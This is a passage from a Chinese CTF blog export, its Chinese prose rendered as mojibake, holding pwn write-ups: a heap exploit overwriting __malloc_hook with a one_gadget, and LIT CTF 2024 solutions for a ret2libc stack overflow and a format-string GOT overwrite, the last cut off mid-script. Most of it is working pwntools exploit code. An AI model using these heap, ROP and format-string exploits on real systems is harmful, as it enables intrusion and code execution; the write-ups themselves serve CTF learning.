<p><img src="https://s2.loli.net/2024/08/19/Nzm9jpiFIac1Buo.png" alt="76100a7ca52f734243be622dc08a5717.png"></p>
<p>æ³„éœ²main_arenaåé¢è¿›è€Œå¾—åˆ°libc_baseçš„å€¼ï¼Œåé¢malloc_hooké‚£é‡Œæ‰¾åˆ°ä¸€å—0x7fçš„å†…å­˜ï¼Œæ¥ä¾›æˆ‘ç”³è¯·chunkã€‚è¯¥æ€ä¹ˆæ‰¾å‘¢ï¼Ÿå¯ä»¥çœ‹æˆ‘çš„å¦ä¸€ç¯‡æ–‡ç« ï¼ˆåˆšå†™å®Œï¼Œå“ˆå“ˆå“ˆå“ˆå“ˆï¼‰ã€‚åœ¨è¿™é‡Œä¸èµ˜è¿°äº†ã€‚</p>
<p><img src="https://s2.loli.net/2024/08/19/DQlNR6c4IY1i72s.png" alt="3f5541b4e72311951ddbcaa4d6da5512.png"></p>
<p>æ‰¾ç”³è¯·çš„chunkä½ç½®ï¼Œfakechunkã€‚æœ€åå†åˆ©ç”¨æˆ‘ä»¬çš„fastbinsçš„æ‰‹æ³•ï¼Œç”³è¯·å›æ¥chunk_4çš„å†…å­˜ï¼Œä½†ä¸è¦å…¨éƒ¨ç”³è¯·å®Œï¼Œå› ä¸ºå¦‚æœæˆ‘ç›´æ¥ç”³è¯·ä¸€ä¸ª0x80ï¼Œåé¢deleteçš„æ—¶å€™å®ƒä¼šè¿›å…¥åˆ°unsortbinsé‡Œé¢ï¼Œä¸å¥½åˆ©ç”¨ã€‚</p>
<p><img src="https://s2.loli.net/2024/08/19/Pb6vSaA4DRFI3Ue.png" alt="0d76a8c8747cc16bc036376e27334a66.png"></p>
<p>å› ä¸ºchunk_2å’Œchunk_4é‡å ï¼Œæ‰€ä»¥æˆ‘å¯ä»¥ä¿®æ”¹è¿™ä¸ªfreeçš„chunk_4çš„å†…å®¹ï¼Œå°†å…¶fdæŒ‡é’ˆæ”¹æˆæˆ‘çš„fake_chunkçš„ä½ç½®</p>
<p><img src="https://s2.loli.net/2024/08/19/MA2BRl5CKYf4Uzx.png" alt="aabd2aed0077f51a6326151e96d17f0e.png"></p>
<p>æœ€åå°±æ˜¯ç”³è¯·åˆ°æˆ‘ä»¬çš„fake_chunkçš„å†…å®¹ï¼Œè¿›è€Œä¿®æ”¹ï¼Œmalloc_hookä¸ºone_gadgetçš„å€¼ã€‚</p>
<p>å°ç™½è‚¯å®šå¥½å¥‡ä¸ºå•¥ï¼Œç”¨çš„æ˜¯callocä¸ºå•¥ä¿®æ”¹mallocï¼Œå› ä¸ºè°ƒç”¨callocä¼šä½¿ç”¨åˆ°mallocã€‚è¿˜æœ‰ç–‘æƒ‘è¿™ä¸ª</p>
<p><img src="https://s2.loli.net/2024/08/19/6PwDAZvIQjY9nNf.png" alt="48b63d8595a19fe96d58cc5a19667504.png">æ€ä¹ˆå¾—åˆ°çš„å‘¢ã€‚ä½ çœ‹çœ‹ä¸Šä¸€å¼ å›¾å“ªä¸ªåé¢-0x1bã€‚ä½ è¿™ä¸ªoffsetå°±æ˜¯0x1b-0x8ã€‚</p>
<p><img src="https://s2.loli.net/2024/08/19/JQGsTuN52vpLUAw.png" alt="ba05438be2f3f04a8ca83c1c24c406bc.png"></p>
<h5 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h5><p><img src="https://s2.loli.net/2024/08/19/s5lZ42Ee86zDbjS.png" alt="754c9bf197db17ed97a24555cca3b767.png"></p>
<h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">exp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    
    libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/home/da1sy/environment/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so"</span><span class="token punctuation">)</span>
    <span class="token comment"># libc = ELF("/home/da1sy/environment/glibc-all-in-one/libs/2.23-0ubuntu11.3_i386/libc-2.23.so")</span>
    <span class="token comment"># libc = ELF("/home/da1sy/environment/glibc-all-in-one/libs/2.27-3ubuntu1.5_amd64/libc-2.23.so")</span>
    <span class="token comment"># libc = ELF("/home/da1sy/environment/glibc-all-in-one/libs/2.27-3ubuntu1.5_i386/libc-2.23.so")</span>

    <span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">:</span>
        io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Command:"</span><span class="token punctuation">)</span>
        io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>
        io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Size:"</span><span class="token punctuation">)</span>
        io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token comment"># io.recvuntil("\n")</span>
        <span class="token comment"># io.sendline(name)</span>
        <span class="token comment"># io.recvuntil("\n")</span>
        <span class="token comment"># io.sendline(content)</span>

    <span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>
        io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"Command:"</span><span class="token punctuation">)</span>
        io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'2'</span><span class="token punctuation">)</span>
        io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Index:'</span><span class="token punctuation">)</span>
        io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>
        io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Size:'</span><span class="token punctuation">)</span>
        io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Content:'</span><span class="token punctuation">)</span>
        io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>content<span class="token punctuation">)</span>
        

    <span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>
        io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Command:"</span><span class="token punctuation">)</span>
        io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'4'</span><span class="token punctuation">)</span>
        io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Index:'</span><span class="token punctuation">)</span>
        io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>
        io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Command:"</span><span class="token punctuation">)</span>
        io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'3'</span><span class="token punctuation">)</span>
        io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Index:"</span><span class="token punctuation">)</span>
        io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>

    add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token comment">#0</span>
    add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token comment">#1</span>
    add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token comment">#2</span>
    add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token comment">#3</span>
    add<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">)</span><span class="token comment">#4</span>
    
    delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
    delete<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>

    padding <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x21</span><span class="token punctuation">)</span>
    payload <span class="token operator">=</span> padding<span class="token operator">*</span><span class="token number">2</span> <span class="token operator">+</span> p8<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">)</span>

    edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>
    edit<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span>padding<span class="token punctuation">)</span>

    add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token comment">#1 è¿™ä¸ªæŠŠåŸæ¥chunk_2ç”³è¯·å›æ¥äº†</span>
    add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token comment">#2 è¿™ä¸ªchunkå…¶å®å’Œ4å·é‡å äº†</span>

    payload <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x91</span><span class="token punctuation">)</span>
    edit<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span><span class="token comment"># æ¢å¤chunk_4çš„sizeå¤§å°</span>

    add<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">)</span><span class="token comment"># 5é˜²æ­¢å…¶ä¸topchunkåˆå¹¶çš„</span>
    
    delete<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token comment">#chunkè¢«æ”¾åˆ°äº†unsortbinsé‡Œé¢</span>

    show<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>

    unsortbins_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"\x7f"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'unsortbins_addr = </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">hex</span><span class="token punctuation">(</span>unsortbins_addr<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>

    main_arena <span class="token operator">=</span> unsortbins_addr <span class="token operator">-</span> <span class="token number">0x58</span>
    log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'main_arena = </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">hex</span><span class="token punctuation">(</span>main_arena<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>

    malloc_hook <span class="token operator">=</span> main_arena <span class="token operator">-</span> <span class="token number">0x10</span>
    libc_base <span class="token operator">=</span> malloc_hook <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">]</span>
    log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'libc_base = </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">hex</span><span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>

    payload <span class="token operator">=</span> p64<span class="token punctuation">(</span>main_arena <span class="token operator">-</span> <span class="token number">0x18</span> <span class="token operator">-</span> <span class="token number">0x1b</span><span class="token punctuation">)</span>
    log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'fake_chunk = </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">hex</span><span class="token punctuation">(</span>main_arena <span class="token operator">-</span> <span class="token number">0x18</span> <span class="token operator">-</span> <span class="token number">0x1b</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>

    add<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">)</span><span class="token comment">#4 ç”³è¯·ä¸å¯ä»¥å¤§äº0x80ï¼Œé˜²æ­¢ä½ åé¢chunk4è¿›å…¥åˆ°unsortbinsé‡Œé¢</span>
    delete<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token comment"># è¿™ä¸€æ­¥ç”³è¯·å›æ¥ä¸»è¦æ˜¯ä¸ºäº†è®©chunk4è¿›å…¥åˆ°fastbinsé‡Œé¢</span>
    
    payload <span class="token operator">=</span> p64<span class="token punctuation">(</span>main_arena <span class="token operator">-</span> <span class="token number">0x18</span> <span class="token operator">-</span> <span class="token number">0x1b</span><span class="token punctuation">)</span>
    edit<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>

    add<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">)</span><span class="token comment">#5 å°†ä¸Šä¸€æ­¥ç”³è¯·çš„chunkç»™å¾—åˆ°</span>
    add<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">)</span><span class="token comment">#6 å¾—åˆ°æˆ‘ä»¬çš„fake chunk</span>

    payload <span class="token operator">=</span> p8<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">2</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>libc_base <span class="token operator">+</span> <span class="token number">0x4526a</span><span class="token punctuation">)</span>
    log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'one_gadget = </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">hex</span><span class="token punctuation">(</span>libc_base <span class="token operator">+</span> <span class="token number">0x4526a</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>
    edit<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>

    add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span>

    gdb<span class="token punctuation">(</span><span class="token punctuation">)</span>
exp<span class="token punctuation">(</span><span class="token punctuation">)</span>   

io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨"></p>
<p>â€‹                                                                                                                                                                                                            </p>
]]></content>
      <categories>
        <category>åšé¢˜ç¬”è®°</category>
        <category>ç§¯ç´¯</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>Heap</tag>
      </tags>
  </entry>
  <entry>
    <title>LIT - CTF - PWNéƒ¨åˆ†é¢˜è§£</title>
    <url>/2024/08/15/lit-ctf-pwn%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/</url>
    <content><![CDATA[<h5 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h5><blockquote>
<h2 id="LIT-2024"><a href="#LIT-2024" class="headerlink" title="LIT 2024"></a>LIT 2024</h2><p>Hi everyone,</p>
<p> We have some updates about Standard Round.</p>
<p> Due to unforeseen circumstances, <strong>we will be delaying the Standard Round by a week (contest window will be open from Aug 16-20)</strong>. We want to provide high quality problems for our contestants, and the extra time will allow us to finish preparing and testing the problems and the platform. <strong>CTF will still be running at the original planned time</strong>, and we hope you will enjoy the challenges we have written this year!</p>
</blockquote>
<p><strong>ç›®å½•</strong></p>
<p>[LIT 2024]</p>
<p>[pwn&#x2F;Function Pairing]</p>
<p>[pwn&#x2F;Infinite Echo]</p>
<p>[pwn&#x2F;recurse ]</p>
<p>[pwn&#x2F;w4dup 2de ]</p>
<p>[ pwn&#x2F;iloveseccomp]</p>
<p>[pwn&#x2F;How to Raise a Boring Vuln Flat]</p>
<hr>
<h5 id="pwn-Function-Pairing"><a href="#pwn-Function-Pairing" class="headerlink" title="pwn&#x2F;Function Pairing"></a>pwn&#x2F;Function Pairing</h5><blockquote>
<p>I love how functions in C are named! We have: - open and close - fopen and fclose - read and write - fread and fwrite - gets and puts - fgets and fputs Connect with nc litctf.org 31774</p>
</blockquote>
<p><img src="https://s2.loli.net/2024/08/19/rYVxRhFP815bj3y.png" alt="f5b5f71d9a73479c9d8c95dcdf0e4032.png"></p>
<p>ç¬¬ä¸€ä¸ªgetsæœ‰æ ˆæº¢å‡ºã€‚å†åˆ©ç”¨putså‡½æ•°æ³„éœ²å‡ºæ¥libcä¹‹året2libcã€‚</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">exp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> 
    main <span class="token operator">=</span> <span class="token number">0x401196</span>
    fgets_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'fgets'</span><span class="token punctuation">]</span>
    puts_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">"puts"</span><span class="token punctuation">]</span>
    pop_rdi <span class="token operator">=</span> <span class="token number">0x401293</span>
    ret <span class="token operator">=</span> <span class="token number">0x40101a</span>
    ru<span class="token punctuation">(</span><span class="token string">"1. gets/puts\n"</span><span class="token punctuation">)</span>
    pl <span class="token operator">=</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x108</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>fgets_got<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span><span class="token operator">+</span> p64<span class="token punctuation">(</span>main<span class="token punctuation">)</span>
    sl<span class="token punctuation">(</span>pl<span class="token punctuation">)</span>
    ru<span class="token punctuation">(</span><span class="token string">"2. fgets/fputs"</span><span class="token punctuation">)</span>
    sl<span class="token punctuation">(</span><span class="token string">"a"</span><span class="token punctuation">)</span>
    <span class="token comment"># pause()</span>
    ru<span class="token punctuation">(</span><span class="token string">"a\n"</span><span class="token punctuation">)</span>
    fgets <span class="token operator">=</span> u68<span class="token punctuation">(</span><span class="token punctuation">)</span>
    lg<span class="token punctuation">(</span><span class="token string">"fgets"</span><span class="token punctuation">,</span>fgets<span class="token punctuation">)</span>

    libc_base <span class="token operator">=</span> fgets <span class="token operator">-</span> <span class="token number">0x7f380</span>
    system <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0x50d70</span>
    sh <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0x1d8678</span>

    lg<span class="token punctuation">(</span><span class="token string">"libc_base"</span><span class="token punctuation">,</span>libc_base<span class="token punctuation">)</span>
    ru<span class="token punctuation">(</span><span class="token string">"1. gets/puts\n"</span><span class="token punctuation">)</span>
    pl <span class="token operator">=</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x108</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>sh<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span>
    sl<span class="token punctuation">(</span>pl<span class="token punctuation">)</span>
    <span class="token comment"># pause()</span>
    ru<span class="token punctuation">(</span><span class="token string">"2. fgets/fputs"</span><span class="token punctuation">)</span>
    sl<span class="token punctuation">(</span><span class="token string">"a"</span><span class="token punctuation">)</span>

exp<span class="token punctuation">(</span><span class="token punctuation">)</span>


io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨"></p>
<p><img src="https://s2.loli.net/2024/08/19/JGt3MsEvUV4pyDf.png" alt="7d5a82e052a142ea9896511f510cad64.png"></p>
<h5 id="pwn-Infinite-Echo"><a href="#pwn-Infinite-Echo" class="headerlink" title="pwn&#x2F;Infinite Echo"></a>pwn&#x2F;Infinite Echo</h5><blockquote>
<p>You <em>got</em> this! Connect with nc litctf.org 31772.</p>
</blockquote>
<pre class="line-numbers language-csharp" data-language="csharp"><code class="language-csharp"><span class="token preprocessor property">#include &lt;stdio.h></span>
<span class="token preprocessor property">#include &lt;unistd.h></span>

<span class="token return-type class-name"><span class="token keyword">int</span></span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token function">setbuf</span><span class="token punctuation">(</span>stdout<span class="token punctuation">,</span> <span class="token number">0x0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">setbuf</span><span class="token punctuation">(</span>stderr<span class="token punctuation">,</span> <span class="token number">0x0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  
  <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">256</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Infinite Echo!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    buf<span class="token punctuation">[</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">256</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨"></p>
<p>ç»™äº†cæºç ï¼Œå¯ä»¥çœ‹åˆ°æ˜æ˜¾çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ã€‚</p>
<p><img src="https://s2.loli.net/2024/08/19/Ju4zFyPS5Qaksxm.png" alt="1197ad36fd9a423198a77257b585476b.png"></p>
<p>æ£€æŸ¥ä¿æŠ¤ï¼Œå¯ä»¥ä¿®æ”¹gotè¡¨</p>
<p><img src="https://s2.loli.net/2024/08/19/Xi79DuYBItT5GSj.png" alt="0735383487ad44349f285b1dfe42358b.png"></p>
<p>å› ä¸ºæ˜¯åœ¨æ ˆä¸Šçš„ï¼Œåˆ†åˆ«æ³„éœ²å‡ºlibc_baseå’ŒåŸºåœ°å€baseï¼Œä¹‹åæŠŠprintf_gotè¡¨éƒ¨ç½²åˆ°æ ˆä¸Šï¼Œæ¥è¿›è¡Œä¿®æ”¹ã€‚ä¹Ÿå¯ä»¥åˆ©ç”¨fmtstr_payloadè¿›è¡Œä¿®æ”¹ï¼Œoffset &#x3D; 6ã€‚</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">exp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> 

    ru<span class="token punctuation">(</span><span class="token string">"Infinite Echo!\n"</span><span class="token punctuation">)</span>
    sl<span class="token punctuation">(</span><span class="token string">"%34$p-%37$p-"</span><span class="token punctuation">)</span>
    ru<span class="token punctuation">(</span><span class="token string">"-"</span><span class="token punctuation">)</span>
    libc_base <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x1f12e8</span>
    lg<span class="token punctuation">(</span><span class="token string">"libc_base"</span><span class="token punctuation">,</span>libc_base<span class="token punctuation">)</span>
    ru<span class="token punctuation">(</span><span class="token string">"-"</span><span class="token punctuation">)</span>
    base <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x10e0</span>
    lg<span class="token punctuation">(</span><span class="token string">"base"</span><span class="token punctuation">,</span>base<span class="token punctuation">)</span>

    system <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">"system"</span><span class="token punctuation">]</span>
    printf_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">"printf"</span><span class="token punctuation">]</span> <span class="token operator">+</span> base
    lg<span class="token punctuation">(</span><span class="token string">"printf_got"</span><span class="token punctuation">,</span>printf_got<span class="token punctuation">)</span>
    lg<span class="token punctuation">(</span><span class="token string">"system"</span><span class="token punctuation">,</span>system<span class="token punctuation">)</span>
   
    pl <span class="token operator">=</span> cyclic<span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>printf_got<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>printf_got<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">)</span>
    ru<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span>
    s<span class="token punctuation">(</span>pl<span class="token punctuation">)</span>

    s1 <span class="token operator">=</span> <span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">0xffff</span>
    s2 <span class="token operator">=</span> <span class="token punctuation">(</span>system<span class="token operator">>></span><span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">0xff</span>
    lg<span class="token punctuation">(</span><span class="token string">"s1"</span><span class="token punctuation">,</span>s1<span class="token punctuation">)</span>
    lg<span class="token punctuation">(</span><span class="token string">"s2"</span><span class="token punctuation">,</span>s2<span class="token punctuation">)</span>
    pl <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"%c%c%c%c%c%c%c%c%c%c%c%</span><span class="token interpolation"><span class="token punctuation">&#123;</span>s2<span class="token operator">-</span><span class="token number">11</span><span class="token punctuation">&#125;</span></span><span class="token string">c%hhn"</span></span>
